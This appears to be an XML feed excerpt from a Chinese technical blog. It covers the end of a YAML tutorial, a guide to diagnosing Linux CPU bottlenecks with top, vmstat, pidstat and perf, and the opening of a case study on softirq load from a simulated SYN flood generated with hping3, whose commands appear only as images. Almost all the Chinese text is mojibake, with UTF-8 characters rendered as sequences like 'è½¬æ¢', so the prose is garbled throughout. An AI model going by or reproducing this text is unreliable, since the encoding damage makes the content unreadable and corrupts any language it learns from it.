href="https://links.jianshu.com/go?to=https://codebeautify.org/yaml-beautifier">YAML Beautifier</a></li></ul></li><li>è½¬æ¢<ul><li><a href="https://links.jianshu.com/go?to=https://codebeautify.org/yaml-to-json-xml-csv">YAML Converter</a> - è½¬æ¢ YAML åˆ° JSONã€XML æˆ– CSV(comma separated values) æ ¼å¼ã€‚</li><li><a href="https://links.jianshu.com/go?to=http://yaml-online-parser.appspot.com/">Online YAML Parser</a> - è¾“å‡º YAML åˆ° JSON å’Œ Pythonã€‚</li><li><a href="https://links.jianshu.com/go?to=https://www.beautifyconverter.com/yaml-to-pdf-converter.php">YAML to PDF Table Converter</a> - YAML è½¬æ¢ä¸º PDF tableã€‚</li><li><a href="https://links.jianshu.com/go?to=https://nodeca.github.io/js-yaml/">js-yaml</a> YAML è¾“å‡ºåˆ° JSã€‚<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2>ä»Šå¤©æˆ‘ä»¬å…ˆäº†è§£äº† YAML åå­—ï¼Œæ€»ç»“äº† YAML çš„ç‰¹ç‚¹å’Œå€¼å¾—æ³¨æ„çš„åœ°æ–¹ï¼Œç„¶åå°±æ˜¯ YAML çš„åŸºæœ¬ç”¨æ³•ï¼Œåå­¦ä¹ äº†é«˜çº§ç”¨æ³•ï¼Œé€šè¿‡å¯¹æ¯” XMLã€JSONã€YAML æ˜ç™½äº†æ•°æ®åºåˆ—åŒ–çš„æ¼”å˜ï¼Œæ˜ç™½äº† YAML ä¸ºä½•èƒ½å–å¾—å¼€å‘è€…çš„èŠ³å¿ƒï¼Œä½œä¸ºé…ç½®æ–‡ä»¶å‡ºç°åœ¨å„å¤§åº”ç”¨ä¸Šé¢ã€‚<h2 id="å…¶ä»–è¦ç‚¹"><a href="#å…¶ä»–è¦ç‚¹" class="headerlink" title="å…¶ä»–è¦ç‚¹"></a>å…¶ä»–è¦ç‚¹</h2>å­—ç¬¦ä¸²ä¸­æœ‰ç‰¹æ®Šç¬¦å·è¦æ”¾è¿›åŒå¼•å·é‡Œï¼š<br><img src="http://106.12.125.218/medias/medias/yaml%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E7%9A%84%E7%82%B9/3.png"><br>æ³¨é‡Šä»¥#å¼€å¤´ï¼š<br><img src="http://106.12.125.218/medias/medias/yaml%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E7%9A%84%E7%82%B9/4.png"><br>ç ´æŠ˜å· - ä»£è¡¨åé¢çš„æ˜¯åˆ—è¡¨å…ƒç´ ï¼š<br><img src="http://106.12.125.218/medias/medias/yaml%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E7%9A%84%E7%82%B9/5.png"><br>è¾“å…¥å¤šè¡Œå­—ç¬¦ä¸²ç”¨ | ï¼š<br><img src="http://106.12.125.218/medias/medias/yaml%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E7%9A%84%E7%82%B9/6.png"><br>å•è¡Œå­—ç¬¦ä¸²ç”¨ &gt; :<br><img src="http://106.12.125.218/medias/medias/yaml%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E7%9A%84%E7%82%B9/7.png"><br>â€œ|+â€ï¼Œä¿ç•™æ¯è¡Œå°¾éƒ¨çš„æ¢è¡Œç¬¦\nçš„åŒæ—¶ï¼Œä¿ç•™å†…å®¹ç»“å°¾å¤„çš„æ¢è¡Œç¬¦\nã€‚<br>â€œ|-â€œï¼Œä¿ç•™æ¯è¡Œå°¾éƒ¨çš„æ¢è¡Œç¬¦\nçš„åŒæ—¶ï¼Œåˆ é™¤å†…å®¹ç»“å°¾å¤„çš„æ¢è¡Œç¬¦\nã€‚<br>ç”¨$å¼•ç”¨ç¯å¢ƒå˜é‡ï¼š<br><img src="http://106.12.125.218/medias/medias/yaml%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E7%9A%84%E7%82%B9/8.png"><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2></li></ul></li></ol><ul><li><a href="https://links.jianshu.com/go?to=https://yaml.org/">yaml.org</a></li><li><a href="https://links.jianshu.com/go?to=https://dev.to/paulasantamaria/introduction-to-yaml-125f">introduction-to-yaml-125f</a></li><li><a href="https://links.jianshu.com/go?to=https://www.educative.io/courses/introduction-to-yaml">introduction-to-yaml</a></li><li><a href="https://www.jianshu.com/p/d368084ed080">https://www.jianshu.com/p/d368084ed080</a><h2 id=""><a href="#" class="headerlink" title=""></a></h2></li></ul>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> k8s </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¥—è·¯ï¼šå¦‚ä½•è¿…é€Ÿåˆ†æå‡ºç³»ç»ŸCPUçš„ç“¶é¢ˆåœ¨å“ªé‡Œï¼Ÿ</title>
      <link href="/2022/06/29/%E5%A5%97%E8%B7%AF%EF%BC%9A%E5%A6%82%E4%BD%95%E8%BF%85%E9%80%9F%E5%88%86%E6%9E%90%E5%87%BA%E7%B3%BB%E7%BB%9FCPU%E7%9A%84%E7%93%B6%E9%A2%88%E5%9C%A8%E5%93%AA%E9%87%8C%EF%BC%9F/"/>
      <url>/2022/06/29/%E5%A5%97%E8%B7%AF%EF%BC%9A%E5%A6%82%E4%BD%95%E8%BF%85%E9%80%9F%E5%88%86%E6%9E%90%E5%87%BA%E7%B3%BB%E7%BB%9FCPU%E7%9A%84%E7%93%B6%E9%A2%88%E5%9C%A8%E5%93%AA%E9%87%8C%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="å¯¼å›¾"><a href="#å¯¼å›¾" class="headerlink" title="å¯¼å›¾"></a>å¯¼å›¾</h2><h3 id="CPUæ€§èƒ½æŒ‡æ ‡"><a href="#CPUæ€§èƒ½æŒ‡æ ‡" class="headerlink" title="CPUæ€§èƒ½æŒ‡æ ‡"></a>CPUæ€§èƒ½æŒ‡æ ‡</h3><p><img src="https://snowgo.top/medias/medias/%E5%A5%97%E8%B7%AF%EF%BC%9A%E5%A6%82%E4%BD%95%E8%BF%85%E9%80%9F%E5%88%86%E6%9E%90%E5%87%BA%E7%B3%BB%E7%BB%9FCPU%E7%9A%84%E7%93%B6%E9%A2%88%E5%9C%A8%E5%93%AA%E9%87%8C%EF%BC%9F/0.png"></p><h3 id="æ ¹æ®æŒ‡æ ‡æ‰¾å·¥å…·-CPUæ€§èƒ½"><a href="#æ ¹æ®æŒ‡æ ‡æ‰¾å·¥å…·-CPUæ€§èƒ½" class="headerlink" title="æ ¹æ®æŒ‡æ ‡æ‰¾å·¥å…·(CPUæ€§èƒ½)"></a>æ ¹æ®æŒ‡æ ‡æ‰¾å·¥å…·(CPUæ€§èƒ½)</h3><p><img src="https://snowgo.top/medias/medias/%E5%A5%97%E8%B7%AF%EF%BC%9A%E5%A6%82%E4%BD%95%E8%BF%85%E9%80%9F%E5%88%86%E6%9E%90%E5%87%BA%E7%B3%BB%E7%BB%9FCPU%E7%9A%84%E7%93%B6%E9%A2%88%E5%9C%A8%E5%93%AA%E9%87%8C%EF%BC%9F/1.png"></p><h3 id="æ ¹æ®å·¥å…·æŸ¥æŒ‡æ ‡-CPUæ€§èƒ½"><a href="#æ ¹æ®å·¥å…·æŸ¥æŒ‡æ ‡-CPUæ€§èƒ½" class="headerlink" title="æ ¹æ®å·¥å…·æŸ¥æŒ‡æ ‡ (CPUæ€§èƒ½)"></a>æ ¹æ®å·¥å…·æŸ¥æŒ‡æ ‡ (CPUæ€§èƒ½)</h3><p><img src="https://snowgo.top/medias/medias/%E5%A5%97%E8%B7%AF%EF%BC%9A%E5%A6%82%E4%BD%95%E8%BF%85%E9%80%9F%E5%88%86%E6%9E%90%E5%87%BA%E7%B3%BB%E7%BB%9FCPU%E7%9A%84%E7%93%B6%E9%A2%88%E5%9C%A8%E5%93%AA%E9%87%8C%EF%BC%9F/2.png"></p><h2 id="CPU-ç¼“å­˜çš„å‘½ä¸­ç‡"><a href="#CPU-ç¼“å­˜çš„å‘½ä¸­ç‡" class="headerlink" title="CPU ç¼“å­˜çš„å‘½ä¸­ç‡"></a>CPU ç¼“å­˜çš„å‘½ä¸­ç‡</h2><p>ç”±äº CPU å‘å±•çš„é€Ÿåº¦è¿œå¿«äºå†…å­˜çš„å‘å±•ï¼ŒCPU çš„å¤„ç†é€Ÿåº¦å°±æ¯”å†…å­˜çš„è®¿é—®é€Ÿåº¦å¿«å¾—å¤šã€‚è¿™æ ·ï¼ŒCPU åœ¨è®¿é—®å†…å­˜çš„æ—¶å€™ï¼Œå…ä¸äº†è¦ç­‰å¾…å†…å­˜çš„å“åº”ã€‚ä¸ºäº†åè°ƒè¿™ä¸¤è€…å·¨å¤§çš„æ€§èƒ½å·®è·ï¼ŒCPU ç¼“å­˜ï¼ˆé€šå¸¸æ˜¯å¤šçº§ç¼“å­˜ï¼‰å°±å‡ºç°äº†ã€‚<br><img src="https://snowgo.top/medias/medias/%E5%A5%97%E8%B7%AF%EF%BC%9A%E5%A6%82%E4%BD%95%E8%BF%85%E9%80%9F%E5%88%86%E6%9E%90%E5%87%BA%E7%B3%BB%E7%BB%9FCPU%E7%9A%84%E7%93%B6%E9%A2%88%E5%9C%A8%E5%93%AA%E9%87%8C%EF%BC%9F/3.png"><br>å°±åƒä¸Šé¢è¿™å¼ å›¾æ˜¾ç¤ºçš„ï¼ŒCPU ç¼“å­˜çš„é€Ÿåº¦ä»‹äº CPU å’Œå†…å­˜ä¹‹é—´ï¼Œç¼“å­˜çš„æ˜¯çƒ­ç‚¹çš„å†…å­˜æ•°æ®ã€‚æ ¹æ®ä¸æ–­å¢é•¿çš„çƒ­ç‚¹æ•°æ®ï¼Œè¿™äº›ç¼“å­˜æŒ‰ç…§å¤§å°ä¸åŒåˆ†ä¸º L1ã€L2ã€L3 ç­‰ä¸‰çº§ç¼“å­˜ï¼Œå…¶ä¸­ L1 å’Œ L2 å¸¸ç”¨åœ¨å•æ ¸ä¸­ï¼Œ L3 åˆ™ç”¨åœ¨å¤šæ ¸ä¸­ã€‚<br>ä» L1 åˆ° L3ï¼Œä¸‰çº§ç¼“å­˜çš„å¤§å°ä¾æ¬¡å¢å¤§ï¼Œç›¸åº”çš„ï¼Œæ€§èƒ½ä¾æ¬¡é™ä½ï¼ˆå½“ç„¶æ¯”å†…å­˜è¿˜æ˜¯å¥½å¾—å¤šï¼‰ã€‚<strong>è€Œå®ƒä»¬çš„å‘½ä¸­ç‡ï¼Œè¡¡é‡çš„æ˜¯ CPU ç¼“å­˜çš„å¤ç”¨æƒ…å†µï¼Œå‘½ä¸­ç‡è¶Šé«˜ï¼Œåˆ™è¡¨ç¤ºæ€§èƒ½è¶Šå¥½ã€‚</strong></p><h2 id="ä¹‹å‰çš„æ¡ˆä¾‹æ€»ç»“"><a href="#ä¹‹å‰çš„æ¡ˆä¾‹æ€»ç»“" class="headerlink" title="ä¹‹å‰çš„æ¡ˆä¾‹æ€»ç»“"></a>ä¹‹å‰çš„æ¡ˆä¾‹æ€»ç»“</h2><ol><li>é¦–å…ˆï¼Œå¹³å‡è´Ÿè½½çš„æ¡ˆä¾‹ã€‚æˆ‘ä»¬å…ˆç”¨ uptimeï¼Œ æŸ¥çœ‹äº†ç³»ç»Ÿçš„å¹³å‡è´Ÿè½½ï¼›è€Œåœ¨å¹³å‡è´Ÿè½½å‡é«˜åï¼Œåˆç”¨ mpstat å’Œ pidstat ï¼Œåˆ†åˆ«è§‚å¯Ÿäº†æ¯ä¸ª CPU å’Œæ¯ä¸ªè¿›ç¨‹ CPU çš„ä½¿ç”¨æƒ…å†µï¼Œè¿›è€Œæ‰¾å‡ºäº†å¯¼è‡´å¹³å‡è´Ÿè½½å‡é«˜çš„è¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„å‹æµ‹å·¥å…· stressã€‚</li><li>ç¬¬äºŒä¸ªï¼Œä¸Šä¸‹æ–‡åˆ‡æ¢çš„æ¡ˆä¾‹ã€‚æˆ‘ä»¬å…ˆç”¨ vmstat ï¼ŒæŸ¥çœ‹äº†ç³»ç»Ÿçš„ä¸Šä¸‹æ–‡åˆ‡æ¢æ¬¡æ•°å’Œä¸­æ–­æ¬¡æ•°ï¼›ç„¶åé€šè¿‡ pidstat ï¼Œè§‚å¯Ÿäº†è¿›ç¨‹çš„è‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢å’Œéè‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢æƒ…å†µï¼›æœ€åé€šè¿‡ pidstat ï¼Œè§‚å¯Ÿäº†çº¿ç¨‹çš„ä¸Šä¸‹æ–‡åˆ‡æ¢æƒ…å†µï¼Œæ‰¾å‡ºäº†ä¸Šä¸‹æ–‡åˆ‡æ¢æ¬¡æ•°å¢å¤šçš„æ ¹æºï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„åŸºå‡†æµ‹è¯•å·¥å…· sysbenchã€‚</li><li>ç¬¬ä¸‰ä¸ªï¼Œè¿›ç¨‹ CPU ä½¿ç”¨ç‡å‡é«˜çš„æ¡ˆä¾‹ã€‚æˆ‘ä»¬å…ˆç”¨ top ï¼ŒæŸ¥çœ‹äº†ç³»ç»Ÿå’Œè¿›ç¨‹çš„ CPU ä½¿ç”¨æƒ…å†µï¼Œå‘ç° CPU ä½¿ç”¨ç‡å‡é«˜çš„è¿›ç¨‹æ˜¯ php-fpmï¼›å†ç”¨ perf top ï¼Œè§‚å¯Ÿ php-fpm çš„è°ƒç”¨é“¾ï¼Œæœ€ç»ˆæ‰¾å‡º CPU å‡é«˜çš„æ ¹æºï¼Œä¹Ÿå°±æ˜¯åº“å‡½æ•° sqrt() ã€‚</li><li>ç¬¬å››ä¸ªï¼Œç³»ç»Ÿçš„ CPU ä½¿ç”¨ç‡å‡é«˜çš„æ¡ˆä¾‹ã€‚æˆ‘ä»¬å…ˆç”¨ top è§‚å¯Ÿåˆ°äº†ç³»ç»Ÿ CPU å‡é«˜ï¼Œä½†é€šè¿‡ top å’Œ pidstat ï¼Œå´æ‰¾ä¸å‡ºé«˜ CPU ä½¿ç”¨ç‡çš„è¿›ç¨‹ã€‚äºæ˜¯ï¼Œæˆ‘ä»¬é‡æ–°å®¡è§† top çš„è¾“å‡ºï¼Œåˆä» CPU ä½¿ç”¨ç‡ä¸é«˜ä½†å¤„äº Running çŠ¶æ€çš„è¿›ç¨‹å…¥æ‰‹ï¼Œæ‰¾å‡ºäº†å¯ç–‘ä¹‹å¤„ï¼Œæœ€ç»ˆé€šè¿‡ perf record å’Œ perf report ï¼Œå‘ç°åŸæ¥æ˜¯çŸ­æ—¶è¿›ç¨‹åœ¨æ£é¬¼ã€‚å¦å¤–ï¼Œå¯¹äºçŸ­æ—¶è¿›ç¨‹ï¼Œæˆ‘è¿˜ä»‹ç»äº†ä¸€ä¸ªä¸“é—¨çš„å·¥å…· execsnoopï¼Œå®ƒå¯ä»¥å®æ—¶ç›‘æ§è¿›ç¨‹è°ƒç”¨çš„å¤–éƒ¨å‘½ä»¤ã€‚</li><li>ç¬¬äº”ä¸ªï¼Œä¸å¯ä¸­æ–­è¿›ç¨‹å’Œåƒµå°¸è¿›ç¨‹çš„æ¡ˆä¾‹ã€‚æˆ‘ä»¬å…ˆç”¨ top è§‚å¯Ÿåˆ°äº† iowait å‡é«˜çš„é—®é¢˜ï¼Œå¹¶å‘ç°äº†å¤§é‡çš„ä¸å¯ä¸­æ–­è¿›ç¨‹å’Œåƒµå°¸è¿›ç¨‹ï¼›æ¥ç€æˆ‘ä»¬ç”¨ dstat å‘ç°æ˜¯è¿™æ˜¯ç”±ç£ç›˜è¯»å¯¼è‡´çš„ï¼Œäºæ˜¯åˆé€šè¿‡ pidstat æ‰¾å‡ºäº†ç›¸å…³çš„è¿›ç¨‹ã€‚ä½†æˆ‘ä»¬ç”¨ strace æŸ¥çœ‹è¿›ç¨‹ç³»ç»Ÿè°ƒç”¨å´å¤±è´¥äº†ï¼Œæœ€ç»ˆè¿˜æ˜¯ç”¨ perf åˆ†æè¿›ç¨‹è°ƒç”¨é“¾ï¼Œæ‰å‘ç°æ ¹æºåœ¨äºç£ç›˜ç›´æ¥ I/O ã€‚</li><li>æœ€åä¸€ä¸ªï¼Œè½¯ä¸­æ–­çš„æ¡ˆä¾‹ã€‚æˆ‘ä»¬é€šè¿‡ top è§‚å¯Ÿåˆ°ï¼Œç³»ç»Ÿçš„è½¯ä¸­æ–­ CPU ä½¿ç”¨ç‡å‡é«˜ï¼›æ¥ç€æŸ¥çœ‹ /proc/softirqsï¼Œ æ‰¾åˆ°äº†å‡ ç§å˜åŒ–é€Ÿç‡è¾ƒå¿«çš„è½¯ä¸­æ–­ï¼›ç„¶åé€šè¿‡ sar å‘½ä»¤ï¼Œå‘ç°æ˜¯ç½‘ç»œå°åŒ…çš„é—®é¢˜ï¼Œæœ€åå†ç”¨ tcpdump ï¼Œæ‰¾å‡ºç½‘ç»œå¸§çš„ç±»å‹å’Œæ¥æºï¼Œç¡®å®šæ˜¯ä¸€ä¸ª SYN FLOOD æ”»å‡»å¯¼è‡´çš„ã€‚<h2 id="æŸ¥æ‰¾é¡ºåº"><a href="#æŸ¥æ‰¾é¡ºåº" class="headerlink" title="æŸ¥æ‰¾é¡ºåº"></a>æŸ¥æ‰¾é¡ºåº</h2></li></ol><p><strong>å…ˆè¿è¡Œå‡ ä¸ªæ”¯æŒæŒ‡æ ‡è¾ƒå¤šçš„å·¥å…·ï¼Œå¦‚ topã€vmstat å’Œ pidstat</strong>ã€‚<br><img src="https://snowgo.top/medias/medias/%E5%A5%97%E8%B7%AF%EF%BC%9A%E5%A6%82%E4%BD%95%E8%BF%85%E9%80%9F%E5%88%86%E6%9E%90%E5%87%BA%E7%B3%BB%E7%BB%9FCPU%E7%9A%84%E7%93%B6%E9%A2%88%E5%9C%A8%E5%93%AA%E9%87%8C%EF%BC%9F/4.png"><br>topã€vmstat å’Œ pidstatè¿™ä¸‰ä¸ªå‘½ä»¤ï¼Œå‡ ä¹åŒ…å«äº†æ‰€æœ‰é‡è¦çš„ CPU æ€§èƒ½æŒ‡æ ‡ï¼Œæ¯”å¦‚ï¼š</p><ul><li>ä» top çš„è¾“å‡ºå¯ä»¥å¾—åˆ°å„ç§ CPU ä½¿ç”¨ç‡ä»¥åŠåƒµå°¸è¿›ç¨‹å’Œå¹³å‡è´Ÿè½½ç­‰ä¿¡æ¯ã€‚</li><li>ä» vmstat çš„è¾“å‡ºå¯ä»¥å¾—åˆ°ä¸Šä¸‹æ–‡åˆ‡æ¢æ¬¡æ•°ã€ä¸­æ–­æ¬¡æ•°ã€è¿è¡ŒçŠ¶æ€å’Œä¸å¯ä¸­æ–­çŠ¶æ€çš„è¿›ç¨‹æ•°ã€‚</li><li>ä» pidstat çš„è¾“å‡ºå¯ä»¥å¾—åˆ°è¿›ç¨‹çš„ç”¨æˆ· CPU ä½¿ç”¨ç‡ã€ç³»ç»Ÿ CPU ä½¿ç”¨ç‡ã€ä»¥åŠè‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢å’Œéè‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢æƒ…å†µã€‚</li></ul><p>ä¸¾å‡ ä¸ªä¾‹å­ï¼š</p><ol><li>ç¬¬ä¸€ä¸ªä¾‹å­ï¼Œpidstat è¾“å‡ºçš„è¿›ç¨‹ç”¨æˆ· CPU ä½¿ç”¨ç‡å‡é«˜ï¼Œä¼šå¯¼è‡´ top è¾“å‡ºçš„ç”¨æˆ· CPU ä½¿ç”¨ç‡å‡é«˜ã€‚æ‰€ä»¥ï¼Œå½“å‘ç° top è¾“å‡ºçš„ç”¨æˆ· CPU ä½¿ç”¨ç‡æœ‰é—®é¢˜æ—¶ï¼Œå¯ä»¥è·Ÿ pidstat çš„è¾“å‡ºåšå¯¹æ¯”ï¼Œè§‚å¯Ÿæ˜¯å¦æ˜¯æŸä¸ªè¿›ç¨‹å¯¼è‡´çš„é—®é¢˜ã€‚è€Œæ‰¾å‡ºå¯¼è‡´æ€§èƒ½é—®é¢˜çš„è¿›ç¨‹åï¼Œå°±è¦ç”¨è¿›ç¨‹åˆ†æå·¥å…·æ¥åˆ†æè¿›ç¨‹çš„è¡Œä¸ºï¼Œæ¯”å¦‚ä½¿ç”¨ strace åˆ†æç³»ç»Ÿè°ƒç”¨æƒ…å†µï¼Œä»¥åŠä½¿ç”¨ perf åˆ†æè°ƒç”¨é“¾ä¸­å„çº§å‡½æ•°çš„æ‰§è¡Œæƒ…å†µã€‚</li><li>ç¬¬äºŒä¸ªä¾‹å­ï¼Œtop è¾“å‡ºçš„å¹³å‡è´Ÿè½½å‡é«˜ï¼Œå¯ä»¥è·Ÿ vmstat è¾“å‡ºçš„è¿è¡ŒçŠ¶æ€å’Œä¸å¯ä¸­æ–­çŠ¶æ€çš„è¿›ç¨‹æ•°åšå¯¹æ¯”ï¼Œè§‚å¯Ÿæ˜¯å“ªç§è¿›ç¨‹å¯¼è‡´çš„è´Ÿè½½å‡é«˜ã€‚</li></ol><ul><li>å¦‚æœæ˜¯ä¸å¯ä¸­æ–­è¿›ç¨‹æ•°å¢å¤šäº†ï¼Œé‚£ä¹ˆå°±éœ€è¦åš I/O çš„åˆ†æï¼Œä¹Ÿå°±æ˜¯ç”¨ dstat æˆ– sar ç­‰å·¥å…·ï¼Œè¿›ä¸€æ­¥åˆ†æ I/O çš„æƒ…å†µã€‚</li><li>å¦‚æœæ˜¯è¿è¡ŒçŠ¶æ€è¿›ç¨‹æ•°å¢å¤šäº†ï¼Œé‚£å°±éœ€è¦å›åˆ° top å’Œ pidstatï¼Œæ‰¾å‡ºè¿™äº›å¤„äºè¿è¡ŒçŠ¶æ€çš„åˆ°åº•æ˜¯ä»€ä¹ˆè¿›ç¨‹ï¼Œç„¶åå†ç”¨è¿›ç¨‹åˆ†æå·¥å…·ï¼Œåšè¿›ä¸€æ­¥åˆ†æã€‚</li></ul><ol start="3"><li>æœ€åä¸€ä¸ªä¾‹å­ï¼Œå½“å‘ç° top è¾“å‡ºçš„è½¯ä¸­æ–­ CPU ä½¿ç”¨ç‡å‡é«˜æ—¶ï¼Œå¯ä»¥æŸ¥çœ‹ /proc/softirqs æ–‡ä»¶ä¸­å„ç§ç±»å‹è½¯ä¸­æ–­çš„å˜åŒ–æƒ…å†µï¼Œç¡®å®šåˆ°åº•æ˜¯å“ªç§è½¯ä¸­æ–­å‡ºçš„é—®é¢˜ã€‚æ¯”å¦‚ï¼Œå‘ç°æ˜¯ç½‘ç»œæ¥æ”¶ä¸­æ–­å¯¼è‡´çš„é—®é¢˜ï¼Œé‚£å°±å¯ä»¥ç»§ç»­ç”¨ç½‘ç»œåˆ†æå·¥å…· sar å’Œ tcpdump æ¥åˆ†æã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç³»ç»Ÿçš„è½¯ä¸­æ–­è‡´CPUä½¿ç”¨ç‡å‡é«˜åº”å¯¹ç­–ç•¥</title>
      <link href="/2022/06/27/%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BD%AF%E4%B8%AD%E6%96%AD%E8%87%B4CPU%E4%BD%BF%E7%94%A8%E7%8E%87%E5%8D%87%E9%AB%98%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5/"/>
      <url>/2022/06/27/%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BD%AF%E4%B8%AD%E6%96%AD%E8%87%B4CPU%E4%BD%BF%E7%94%A8%E7%8E%87%E5%8D%87%E9%AB%98%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¡ˆä¾‹å‡†å¤‡"><a href="#æ¡ˆä¾‹å‡†å¤‡" class="headerlink" title="æ¡ˆä¾‹å‡†å¤‡"></a>æ¡ˆä¾‹å‡†å¤‡</h2><ul><li>sar æ˜¯ä¸€ä¸ªç³»ç»Ÿæ´»åŠ¨æŠ¥å‘Šå·¥å…·ï¼Œæ—¢å¯ä»¥å®æ—¶æŸ¥çœ‹ç³»ç»Ÿçš„å½“å‰æ´»åŠ¨ï¼Œåˆå¯ä»¥é…ç½®ä¿å­˜å’ŒæŠ¥å‘Šå†å²ç»Ÿè®¡æ•°æ®ã€‚</li><li>hping3 æ˜¯ä¸€ä¸ªå¯ä»¥æ„é€  TCP/IP åè®®æ•°æ®åŒ…çš„å·¥å…·ï¼Œå¯ä»¥å¯¹ç³»ç»Ÿè¿›è¡Œå®‰å…¨å®¡è®¡ã€é˜²ç«å¢™æµ‹è¯•ç­‰ã€‚</li><li>tcpdump æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„ç½‘ç»œæŠ“åŒ…å·¥å…·ï¼Œå¸¸ç”¨æ¥åˆ†æå„ç§ç½‘ç»œé—®é¢˜ã€‚</li></ul><p><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BD%AF%E4%B8%AD%E6%96%AD%E8%87%B4CPU%E4%BD%BF%E7%94%A8%E7%8E%87%E5%8D%87%E9%AB%98%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5/0.png"></p><h2 id="æ¡ˆä¾‹æ¨¡æ‹Ÿæ“ä½œ"><a href="#æ¡ˆä¾‹æ¨¡æ‹Ÿæ“ä½œ" class="headerlink" title="æ¡ˆä¾‹æ¨¡æ‹Ÿæ“ä½œ"></a>æ¡ˆä¾‹æ¨¡æ‹Ÿæ“ä½œ</h2><p><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BD%AF%E4%B8%AD%E6%96%AD%E8%87%B4CPU%E4%BD%BF%E7%94%A8%E7%8E%87%E5%8D%87%E9%AB%98%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5/1.png"><br>è¿è¡Œ hping3 å‘½ä»¤ï¼Œæ¥æ¨¡æ‹Ÿ Nginx çš„å®¢æˆ·ç«¯è¯·æ±‚ï¼š<br><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BD%AF%E4%B8%AD%E6%96%AD%E8%87%B4CPU%E4%BD%BF%E7%94%A8%E7%8E%87%E5%8D%87%E9%AB%98%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5/2.png"></p><h2 id="æ’æŸ¥é—®é¢˜"><a href="#æ’æŸ¥é—®é¢˜" class="headerlink" title="æ’æŸ¥é—®é¢˜"></a>æ’æŸ¥é—®é¢˜</h2><p>è¿è¡Œ top å‘½ä»¤ï¼Œçœ‹ä¸€ä¸‹ç³»ç»Ÿæ•´ä½“çš„èµ„æºä½¿ç”¨æƒ…å†µï¼š<br><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BD%AF%E4%B8%AD%E6%96%AD%E8%87%B4CPU%E4%BD%BF%E7%94%A8%E7%8E%87%E5%8D%87%E9%AB%98%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5/3.png"><br>è¿™é‡Œä½ æœ‰æ²¡æœ‰å‘ç°å¼‚å¸¸çš„ç°è±¡ï¼Ÿæˆ‘ä»¬ä»ç¬¬ä¸€è¡Œå¼€å§‹ï¼Œé€ä¸ªçœ‹ä¸€ä¸‹ï¼š</p><ul><li>å¹³å‡è´Ÿè½½å…¨æ˜¯ 0ï¼Œå°±ç»ªé˜Ÿåˆ—é‡Œé¢åªæœ‰ä¸€ä¸ªè¿›ç¨‹ï¼ˆ1 runningï¼‰ã€‚</li><li>æ¯ä¸ª CPU çš„ä½¿ç”¨ç‡éƒ½æŒºä½ï¼Œæœ€é«˜çš„ CPU1 çš„ä½¿ç”¨ç‡ä¹Ÿåªæœ‰ 4.4%ï¼Œå¹¶ä¸ç®—é«˜ã€‚</li><li>å†çœ‹è¿›ç¨‹åˆ—è¡¨ï¼ŒCPU ä½¿ç”¨ç‡æœ€é«˜çš„è¿›ç¨‹ä¹Ÿåªæœ‰ 0.3%ï¼Œè¿˜æ˜¯ä¸é«˜å‘€ã€‚</li></ul><p>ä½†æ˜¯ä»è¿›ç¨‹åˆ—è¡¨ä¸Šä¹Ÿå¯ä»¥çœ‹åˆ°ï¼ŒCPU ä½¿ç”¨ç‡æœ€é«˜çš„ä¹Ÿæ˜¯è½¯ä¸­æ–­è¿›ç¨‹ ksoftirqdã€‚<br>è§‚å¯Ÿ /proc/softirqs æ–‡ä»¶çš„å†…å®¹ï¼š<br><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BD%AF%E4%B8%AD%E6%96%AD%E8%87%B4CPU%E4%BD%BF%E7%94%A8%E7%8E%87%E5%8D%87%E9%AB%98%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5/4.png"></p><p>é€šè¿‡ /proc/softirqs æ–‡ä»¶å†…å®¹çš„å˜åŒ–æƒ…å†µï¼Œä½ å¯ä»¥å‘ç°ï¼Œ 